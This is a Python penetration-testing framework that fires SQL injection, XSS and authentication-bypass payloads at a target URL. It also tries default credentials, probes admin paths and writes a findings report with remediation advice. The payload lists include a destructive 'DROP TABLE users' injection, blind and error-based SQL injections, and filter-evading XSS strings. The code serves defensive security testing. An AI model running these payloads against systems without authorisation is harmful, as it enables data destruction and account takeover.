"""Security penetration testing framework for system validation."""

import logging
import asyncio
import time
import requests
import socket
import ssl
from typing import Dict, List, Optional, Any, Callable, Set
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
import json
import re
import hashlib
import base64
from urllib.parse import urljoin, urlparse

from compliance_sentinel.core.interfaces import SecurityIssue, Severity


logger = logging.getLogger(__name__)


class AttackVector(Enum):
    """Types of attack vectors for penetration testing."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    AUTHORIZATION_BYPASS = "authorization_bypass"
    SESSION_HIJACKING = "session_hijacking"
    DIRECTORY_TRAVERSAL = "directory_traversal"
    COMMAND_INJECTION = "command_injection"
    BUFFER_OVERFLOW = "buffer_overflow"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    INFORMATION_DISCLOSURE = "information_disclosure"
    DENIAL_OF_SERVICE = "denial_of_service"


class TestSeverity(Enum):
    """Penetration test severity levels."""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


@dataclass
class PenetrationTest:
    """Represents a penetration test case."""
    
    test_id: str
    name: str
    description: str
    attack_vector: AttackVector
    severity: TestSeverity
    
    # Test configuration
    target_url: Optional[str] = None
    test_payloads: List[str] = field(default_factory=list)
    expected_responses: List[str] = field(default_factory=list)
    
    # Test metadata
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None
    tags: Set[str] = field(default_factory=set)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert test to dictionary."""
        return {
            'test_id': self.test_id,
            'name': self.name,
            'description': self.description,
            'attack_vector': self.attack_vector.value,
            'severity': self.severity.value,
            'target_url': self.target_url,
            'payloads_count': len(self.test_payloads),
            'cwe_id': self.cwe_id,
            'owasp_category': self.owasp_category,
            'tags': list(self.tags)
        }


@dataclass
class PenetrationTestResult:
    """Result of penetration test execution."""
    
    test_id: str
    test_name: str
    attack_vector: AttackVector
    
    # Test execution
    executed_at: datetime = field(default_factory=datetime.now)
    execution_time_ms: float = 0.0
    
    # Results
    vulnerability_found: bool = False
    confidence_level: float = 0.0  # 0-1
    
    # Evidence
    successful_payloads: List[str] = field(default_factory=list)
    response_evidence: List[str] = field(default_factory=list)
    
    # Details
    findings: List[str] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)
    
    # Error information
    errors: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert result to dictionary."""
        return {
            'test_id': self.test_id,
            'test_name': self.test_name,
            'attack_vector': self.attack_vector.value,
            'executed_at': self.executed_at.isoformat(),
            'execution_time_ms': self.execution_time_ms,
            'vulnerability_found': self.vulnerability_found,
            'confidence_level': self.confidence_level,
            'successful_payloads_count': len(self.successful_payloads),
            'findings_count': len(self.findings),
            'recommendations_count': len(self.recommendations),
            'errors_count': len(self.errors)
        }


class SecurityPenetrationTester:
    """Main penetration testing framework."""
    
    def __init__(self):
        """Initialize penetration tester."""
        self.logger = logging.getLogger(__name__)
        self.tests = {}
        self.results = {}
        
        # Test configuration
        self.timeout_seconds = 30
        self.max_redirects = 5
        self.user_agent = "ComplianceSentinel-PenTest/1.0"
        
        # Load test cases
        self._load_test_cases()
    
    def _load_test_cases(self):
        """Load penetration test cases."""
        # SQL Injection tests
        self.add_test(PenetrationTest(
            test_id="sql_injection_basic",
            name="Basic SQL Injection",
            description="Test for basic SQL injection vulnerabilities",
            attack_vector=AttackVector.SQL_INJECTION,
            severity=TestSeverity.CRITICAL,
            test_payloads=[
                "' OR '1'='1",
                "' OR 1=1--",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
            ],
            expected_responses=[
                "mysql_fetch",
                "ORA-00933",
                "Microsoft OLE DB",
                "SQLServer JDBC Driver",
                "PostgreSQL query failed"
            ],
            cwe_id="CWE-89",
            owasp_category="A03:2021 – Injection",
            tags={"sql_injection", "database", "injection"}
        ))
        
        # XSS tests
        self.add_test(PenetrationTest(
            test_id="xss_reflected",
            name="Reflected XSS",
            description="Test for reflected cross-site scripting vulnerabilities",
            attack_vector=AttackVector.XSS,
            severity=TestSeverity.HIGH,
            test_payloads=[
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "';alert('XSS');//"
            ],
            expected_responses=[
                "<script>alert('XSS')</script>",
                "onerror=alert",
                "javascript:alert"
            ],
            cwe_id="CWE-79",
            owasp_category="A03:2021 – Injection",
            tags={"xss", "client_side", "injection"}
        ))
        
        # Authentication bypass tests
        self.add_test(PenetrationTest(
            test_id="auth_bypass_basic",
            name="Authentication Bypass",
            description="Test for authentication bypass vulnerabilities",
            attack_vector=AttackVector.AUTHENTICATION_BYPASS,
            severity=TestSeverity.CRITICAL,
            test_payloads=[
                "admin'--",
                "admin'/*",
                "' OR 1=1#",
                "admin' OR '1'='1",
                "' OR 'x'='x"
            ],
            cwe_id="CWE-287",
            owasp_category="A07:2021 – Identification and Authentication Failures",
            tags={"authentication", "bypass", "login"}
        ))
    
    def add_test(self, test: PenetrationTest):
        """Add a penetration test case."""
        self.tests[test.test_id] = test
    
    async def run_test(self, test_id: str, target_url: str) -> PenetrationTestResult:
        """Run a specific penetration test."""
        if test_id not in self.tests:
            result = PenetrationTestResult(
                test_id=test_id,
                test_name="Unknown Test",
                attack_vector=AttackVector.SQL_INJECTION
            )
            result.errors.append(f"Test {test_id} not found")
            return result
        
        test = self.tests[test_id]
        result = PenetrationTestResult(
            test_id=test_id,
            test_name=test.name,
            attack_vector=test.attack_vector
        )
        
        start_time = time.time()
        
        try:
            # Execute test based on attack vector
            if test.attack_vector == AttackVector.SQL_INJECTION:
                await self._test_sql_injection(test, target_url, result)
            elif test.attack_vector == AttackVector.XSS:
                await self._test_xss(test, target_url, result)
            elif test.attack_vector == AttackVector.AUTHENTICATION_BYPASS:
                await self._test_auth_bypass(test, target_url, result)
            else:
                result.errors.append(f"Attack vector {test.attack_vector.value} not implemented")
            
            # Calculate confidence level
            result.confidence_level = self._calculate_confidence(result, test)
            
        except Exception as e:
            self.logger.error(f"Error running test {test_id}: {e}")
            result.errors.append(f"Test execution error: {str(e)}")
        
        result.execution_time_ms = (time.time() - start_time) * 1000
        self.results[test_id] = result
        
        return result
    
    async def _test_sql_injection(self, test: PenetrationTest, target_url: str, result: PenetrationTestResult):
        """Test for SQL injection vulnerabilities."""
        session = requests.Session()
        session.headers.update({'User-Agent': self.user_agent})
        
        for payload in test.test_payloads:
            try:
                # Test GET parameters
                test_url = f"{target_url}?id={payload}"
                response = session.get(test_url, timeout=self.timeout_seconds)
                
                # Check for SQL error messages
                for error_pattern in test.expected_responses:
                    if error_pattern.lower() in response.text.lower():
                        result.vulnerability_found = True
                        result.successful_payloads.append(payload)
                        result.response_evidence.append(f"SQL error found: {error_pattern}")
                        result.findings.append(f"SQL injection vulnerability detected with payload: {payload}")
                
                # Test POST parameters
                post_data = {'username': payload, 'password': 'test'}
                response = session.post(target_url, data=post_data, timeout=self.timeout_seconds)
                
                for error_pattern in test.expected_responses:
                    if error_pattern.lower() in response.text.lower():
                        result.vulnerability_found = True
                        result.successful_payloads.append(payload)
                        result.response_evidence.append(f"SQL error in POST: {error_pattern}")
                
            except requests.RequestException as e:
                result.errors.append(f"Request failed for payload {payload}: {str(e)}")
        
        if result.vulnerability_found:
            result.recommendations.extend([
                "Use parameterized queries or prepared statements",
                "Implement input validation and sanitization",
                "Apply principle of least privilege to database accounts",
                "Enable database query logging and monitoring"
            ])
    
    async def _test_xss(self, test: PenetrationTest, target_url: str, result: PenetrationTestResult):
        """Test for XSS vulnerabilities."""
        session = requests.Session()
        session.headers.update({'User-Agent': self.user_agent})
        
        for payload in test.test_payloads:
            try:
                # Test reflected XSS in GET parameters
                test_url = f"{target_url}?search={payload}"
                response = session.get(test_url, timeout=self.timeout_seconds)
                
                # Check if payload is reflected in response
                if payload in response.text:
                    result.vulnerability_found = True
                    result.successful_payloads.append(payload)
                    result.response_evidence.append(f"Payload reflected: {payload}")
                    result.findings.append(f"Reflected XSS vulnerability detected with payload: {payload}")
                
                # Test XSS in POST parameters
                post_data = {'comment': payload, 'name': 'test'}
                response = session.post(target_url, data=post_data, timeout=self.timeout_seconds)
                
                if payload in response.text:
                    result.vulnerability_found = True
                    result.successful_payloads.append(payload)
                    result.response_evidence.append(f"Payload reflected in POST: {payload}")
                
            except requests.RequestException as e:
                result.errors.append(f"Request failed for payload {payload}: {str(e)}")
        
        if result.vulnerability_found:
            result.recommendations.extend([
                "Implement proper output encoding/escaping",
                "Use Content Security Policy (CSP) headers",
                "Validate and sanitize all user inputs",
                "Use secure templating engines with auto-escaping"
            ])
    
    async def _test_auth_bypass(self, test: PenetrationTest, target_url: str, result: PenetrationTestResult):
        """Test for authentication bypass vulnerabilities."""
        session = requests.Session()
        session.headers.update({'User-Agent': self.user_agent})
        
        for payload in test.test_payloads:
            try:
                # Test authentication bypass in login form
                login_data = {
                    'username': payload,
                    'password': 'any_password'
                }
                
                response = session.post(target_url, data=login_data, timeout=self.timeout_seconds)
                
                # Check for successful login indicators
                success_indicators = [
                    'welcome', 'dashboard', 'logout', 'profile',
                    'success', 'authenticated', 'logged in'
                ]
                
                response_lower = response.text.lower()
                for indicator in success_indicators:
                    if indicator in response_lower:
                        # Additional verification - check if we're redirected to protected area
                        if response.status_code in [200, 302] and 'login' not in response_lower:
                            result.vulnerability_found = True
                            result.successful_payloads.append(payload)
                            result.response_evidence.append(f"Authentication bypass successful: {indicator}")
                            result.findings.append(f"Authentication bypass detected with payload: {payload}")
                
            except requests.RequestException as e:
                result.errors.append(f"Request failed for payload {payload}: {str(e)}")
        
        if result.vulnerability_found:
            result.recommendations.extend([
                "Implement proper input validation for authentication",
                "Use parameterized queries for authentication checks",
                "Implement account lockout mechanisms",
                "Add multi-factor authentication",
                "Use secure session management"
            ])
    
    def _calculate_confidence(self, result: PenetrationTestResult, test: PenetrationTest) -> float:
        """Calculate confidence level for test results."""
        if not result.vulnerability_found:
            return 0.0
        
        confidence = 0.0
        
        # Base confidence from successful payloads
        payload_ratio = len(result.successful_payloads) / len(test.test_payloads)
        confidence += payload_ratio * 0.6
        
        # Confidence from evidence
        if result.response_evidence:
            confidence += min(len(result.response_evidence) * 0.1, 0.3)
        
        # Confidence from findings
        if result.findings:
            confidence += min(len(result.findings) * 0.05, 0.1)
        
        return min(confidence, 1.0)
    
    async def run_all_tests(self, target_url: str) -> Dict[str, PenetrationTestResult]:
        """Run all penetration tests against target."""
        results = {}
        
        for test_id in self.tests:
            self.logger.info(f"Running penetration test: {test_id}")
            result = await self.run_test(test_id, target_url)
            results[test_id] = result
        
        return results
    
    def get_test_summary(self) -> Dict[str, Any]:
        """Get summary of penetration test results."""
        if not self.results:
            return {
                'total_tests': len(self.tests),
                'executed_tests': 0
            }
        
        total_tests = len(self.tests)
        executed_tests = len(self.results)
        
        vulnerabilities_found = sum(1 for r in self.results.values() if r.vulnerability_found)
        high_confidence = sum(1 for r in self.results.values() if r.confidence_level > 0.7)
        
        # Group by attack vector
        attack_vectors = {}
        for result in self.results.values():
            vector = result.attack_vector.value
            if vector not in attack_vectors:
                attack_vectors[vector] = {'total': 0, 'vulnerable': 0}
            attack_vectors[vector]['total'] += 1
            if result.vulnerability_found:
                attack_vectors[vector]['vulnerable'] += 1
        
        return {
            'total_tests': total_tests,
            'executed_tests': executed_tests,
            'vulnerabilities_found': vulnerabilities_found,
            'high_confidence_findings': high_confidence,
            'vulnerability_rate': (vulnerabilities_found / executed_tests * 100) if executed_tests > 0 else 0,
            'attack_vectors': attack_vectors
        }


# Specialized penetration testers

class SQLInjectionTester:
    """Specialized SQL injection penetration tester."""
    
    def __init__(self):
        """Initialize SQL injection tester."""
        self.logger = logging.getLogger(__name__)
        
        # Advanced SQL injection payloads
        self.payloads = [
            # Basic injections
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1/*",
            
            # Union-based injections
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            
            # Boolean-based blind injections
            "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' AND (SELECT LENGTH(database()))>0--",
            
            # Time-based blind injections
            "'; WAITFOR DELAY '00:00:05'--",
            "' AND (SELECT SLEEP(5))--",
            "'; SELECT pg_sleep(5)--",
            
            # Error-based injections
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        # Database error patterns
        self.error_patterns = [
            # MySQL
            "mysql_fetch_array", "mysql_num_rows", "mysql_error", "Warning: mysql_",
            
            # PostgreSQL
            "PostgreSQL query failed", "pg_query()", "pg_exec()",
            
            # SQL Server
            "Microsoft OLE DB Provider", "ODBC SQL Server Driver", "SQLServer JDBC Driver",
            
            # Oracle
            "ORA-00933", "ORA-00921", "ORA-00936",
            
            # Generic
            "SQL syntax", "syntax error", "unexpected token"
        ]
    
    async def test_sql_injection(self, target_url: str, parameters: Dict[str, str]) -> Dict[str, Any]:
        """Test for SQL injection vulnerabilities."""
        results = {
            'vulnerable': False,
            'payloads_tested': 0,
            'successful_payloads': [],
            'error_messages': [],
            'confidence': 0.0
        }
        
        session = requests.Session()
        
        for param_name, param_value in parameters.items():
            for payload in self.payloads:
                try:
                    # Test with payload
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    response = session.get(target_url, params=test_params, timeout=30)
                    results['payloads_tested'] += 1
                    
                    # Check for error messages
                    for error_pattern in self.error_patterns:
                        if error_pattern.lower() in response.text.lower():
                            results['vulnerable'] = True
                            results['successful_payloads'].append(payload)
                            results['error_messages'].append(error_pattern)
                    
                except requests.RequestException as e:
                    self.logger.debug(f"Request failed: {e}")
        
        # Calculate confidence
        if results['vulnerable']:
            results['confidence'] = min(len(results['successful_payloads']) / len(self.payloads), 1.0)
        
        return results


class XSSTester:
    """Specialized XSS penetration tester."""
    
    def __init__(self):
        """Initialize XSS tester."""
        self.logger = logging.getLogger(__name__)
        
        # XSS payloads
        self.payloads = [
            # Basic script tags
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>confirm('XSS')</script>",
            
            # Event handlers
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe onload=alert('XSS')>",
            
            # JavaScript URLs
            "javascript:alert('XSS')",
            "javascript:confirm('XSS')",
            
            # Encoded payloads
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            
            # Filter bypass
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<<SCRIPT>alert('XSS')//<</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>"
        ]
    
    async def test_xss(self, target_url: str, parameters: Dict[str, str]) -> Dict[str, Any]:
        """Test for XSS vulnerabilities."""
        results = {
            'vulnerable': False,
            'payloads_tested': 0,
            'successful_payloads': [],
            'reflection_points': [],
            'confidence': 0.0
        }
        
        session = requests.Session()
        
        for param_name, param_value in parameters.items():
            for payload in self.payloads:
                try:
                    # Test with payload
                    test_params = parameters.copy()
                    test_params[param_name] = payload
                    
                    response = session.get(target_url, params=test_params, timeout=30)
                    results['payloads_tested'] += 1
                    
                    # Check if payload is reflected
                    if payload in response.text:
                        results['vulnerable'] = True
                        results['successful_payloads'].append(payload)
                        results['reflection_points'].append(param_name)
                    
                except requests.RequestException as e:
                    self.logger.debug(f"Request failed: {e}")
        
        # Calculate confidence
        if results['vulnerable']:
            results['confidence'] = min(len(results['successful_payloads']) / len(self.payloads), 1.0)
        
        return results


class AuthenticationTester:
    """Specialized authentication penetration tester."""
    
    def __init__(self):
        """Initialize authentication tester."""
        self.logger = logging.getLogger(__name__)
        
        # Authentication bypass payloads
        self.bypass_payloads = [
            "admin'--",
            "admin'/*",
            "admin'#",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR '1'='1",
            "' OR 'x'='x",
            "admin' OR '1'='1'--",
            "') OR ('1'='1'--",
            "' OR 1=1 LIMIT 1--"
        ]
        
        # Common default credentials
        self.default_credentials = [
            ("admin", "admin"),
            ("admin", "password"),
            ("admin", "123456"),
            ("root", "root"),
            ("test", "test"),
            ("guest", "guest"),
            ("user", "user")
        ]
    
    async def test_authentication_bypass(self, login_url: str) -> Dict[str, Any]:
        """Test for authentication bypass vulnerabilities."""
        results = {
            'bypass_vulnerable': False,
            'default_credentials_found': False,
            'successful_bypasses': [],
            'successful_credentials': [],
            'confidence': 0.0
        }
        
        session = requests.Session()
        
        # Test SQL injection bypasses
        for payload in self.bypass_payloads:
            try:
                login_data = {
                    'username': payload,
                    'password': 'any_password'
                }
                
                response = session.post(login_url, data=login_data, timeout=30)
                
                # Check for successful login indicators
                if self._check_login_success(response):
                    results['bypass_vulnerable'] = True
                    results['successful_bypasses'].append(payload)
                
            except requests.RequestException as e:
                self.logger.debug(f"Bypass test failed: {e}")
        
        # Test default credentials
        for username, password in self.default_credentials:
            try:
                login_data = {
                    'username': username,
                    'password': password
                }
                
                response = session.post(login_url, data=login_data, timeout=30)
                
                if self._check_login_success(response):
                    results['default_credentials_found'] = True
                    results['successful_credentials'].append((username, password))
                
            except requests.RequestException as e:
                self.logger.debug(f"Credential test failed: {e}")
        
        # Calculate confidence
        total_tests = len(self.bypass_payloads) + len(self.default_credentials)
        successful_tests = len(results['successful_bypasses']) + len(results['successful_credentials'])
        
        if successful_tests > 0:
            results['confidence'] = min(successful_tests / total_tests, 1.0)
        
        return results
    
    def _check_login_success(self, response: requests.Response) -> bool:
        """Check if login was successful based on response."""
        success_indicators = [
            'welcome', 'dashboard', 'logout', 'profile',
            'success', 'authenticated', 'logged in'
        ]
        
        failure_indicators = [
            'invalid', 'incorrect', 'failed', 'error',
            'denied', 'unauthorized', 'login'
        ]
        
        response_lower = response.text.lower()
        
        # Check for success indicators
        has_success = any(indicator in response_lower for indicator in success_indicators)
        
        # Check for failure indicators
        has_failure = any(indicator in response_lower for indicator in failure_indicators)
        
        # Consider successful if we have success indicators and no failure indicators
        # or if we get redirected (302) without failure indicators
        return (has_success and not has_failure) or (response.status_code == 302 and not has_failure)


class AuthorizationTester:
    """Specialized authorization penetration tester."""
    
    def __init__(self):
        """Initialize authorization tester."""
        self.logger = logging.getLogger(__name__)
    
    async def test_privilege_escalation(self, 
                                      authenticated_session: requests.Session,
                                      protected_urls: List[str]) -> Dict[str, Any]:
        """Test for privilege escalation vulnerabilities."""
        results = {
            'vulnerable_urls': [],
            'accessible_admin_functions': [],
            'confidence': 0.0
        }
        
        # Test access to administrative functions
        admin_paths = [
            '/admin', '/admin/', '/administrator', '/admin.php',
            '/admin/users', '/admin/config', '/admin/settings',
            '/management', '/control', '/dashboard/admin'
        ]
        
        for url in protected_urls:
            for admin_path in admin_paths:
                try:
                    test_url = urljoin(url, admin_path)
                    response = authenticated_session.get(test_url, timeout=30)
                    
                    # Check if we can access admin functions
                    if response.status_code == 200:
                        admin_indicators = ['admin', 'management', 'control', 'users', 'settings']
                        if any(indicator in response.text.lower() for indicator in admin_indicators):
                            results['accessible_admin_functions'].append(test_url)
                            results['vulnerable_urls'].append(test_url)
                
                except requests.RequestException as e:
                    self.logger.debug(f"Authorization test failed: {e}")
        
        # Calculate confidence
        if results['vulnerable_urls']:
            results['confidence'] = min(len(results['vulnerable_urls']) / len(protected_urls), 1.0)
        
        return results


# Utility functions

def create_penetration_test_report(results: Dict[str, PenetrationTestResult]) -> str:
    """Create a comprehensive penetration test report."""
    
    report = """
# Security Penetration Test Report

## Executive Summary

"""
    
    total_tests = len(results)
    vulnerabilities_found = sum(1 for r in results.values() if r.vulnerability_found)
    high_confidence = sum(1 for r in results.values() if r.confidence_level > 0.7)
    
    report += f"- **Total Tests Executed**: {total_tests}\n"
    report += f"- **Vulnerabilities Found**: {vulnerabilities_found}\n"
    report += f"- **High Confidence Findings**: {high_confidence}\n"
    report += f"- **Overall Risk Level**: {'HIGH' if vulnerabilities_found > 0 else 'LOW'}\n\n"
    
    # Detailed findings
    report += "## Detailed Findings\n\n"
    
    for test_id, result in results.items():
        if result.vulnerability_found:
            report += f"### {result.test_name} (ID: {test_id})\n\n"
            report += f"- **Attack Vector**: {result.attack_vector.value}\n"
            report += f"- **Confidence Level**: {result.confidence_level:.2f}\n"
            report += f"- **Execution Time**: {result.execution_time_ms:.1f}ms\n\n"
            
            if result.findings:
                report += "**Findings:**\n"
                for finding in result.findings:
                    report += f"- {finding}\n"
                report += "\n"
            
            if result.recommendations:
                report += "**Recommendations:**\n"
                for rec in result.recommendations:
                    report += f"- {rec}\n"
                report += "\n"
    
    # Summary by attack vector
    report += "## Summary by Attack Vector\n\n"
    
    attack_vectors = {}
    for result in results.values():
        vector = result.attack_vector.value
        if vector not in attack_vectors:
            attack_vectors[vector] = {'total': 0, 'vulnerable': 0}
        attack_vectors[vector]['total'] += 1
        if result.vulnerability_found:
            attack_vectors[vector]['vulnerable'] += 1
    
    for vector, stats in attack_vectors.items():
        vulnerability_rate = (stats['vulnerable'] / stats['total'] * 100) if stats['total'] > 0 else 0
        report += f"- **{vector.replace('_', ' ').title()}**: {stats['vulnerable']}/{stats['total']} ({vulnerability_rate:.1f}%)\n"
    
    return report


async def run_comprehensive_penetration_test(target_url: str) -> Dict[str, Any]:
    """Run comprehensive penetration test suite."""
    
    tester = SecurityPenetrationTester()
    
    # Run all tests
    results = await tester.run_all_tests(target_url)
    
    # Generate summary
    summary = tester.get_test_summary()
    
    # Generate report
    report = create_penetration_test_report(results)
    
    return {
        'results': {test_id: result.to_dict() for test_id, result in results.items()},
        'summary': summary,
        'report': report
    }